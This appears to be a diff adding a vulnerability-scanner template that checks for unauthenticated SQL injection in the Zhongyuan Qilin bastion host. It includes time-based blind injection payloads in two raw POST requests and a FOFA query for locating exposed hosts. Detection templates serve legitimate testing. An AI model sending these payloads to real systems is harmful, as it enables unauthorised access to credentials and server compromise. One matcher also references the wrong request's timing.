@@ -1,0 +1,41 @@
+id: tosec-jumpserver-admin-php-sqli
+
+info:
+  name: 中远麒麟堡垒机SQL注入
+  author: pphua
+  severity: high
+  description: 中远麒麟堡垒机/baoleiji/api/tokens和admin.php接口处存在sql注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/132328217
+  metadata:
+    fofa-query: cert.subject="Baolei"
+  tags: sqli,jumpserver,iot,tosec
+
+http:
+  - raw:
+      - |
+        POST /admin.php?controller=admin_commonuser HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && duration_1 >=3 && duration_1 <=7 && contains(header_1,'text/html') && contains_all(body_1,'result','username','data')"
+
+  - raw:
+      - |
+        POST /baoleiji/api/tokens HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        
+        constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 403 && duration_2 >=3 && duration_1 <=7 && contains(header_2,'application/json') && contains_all(body_2,'message','name')"
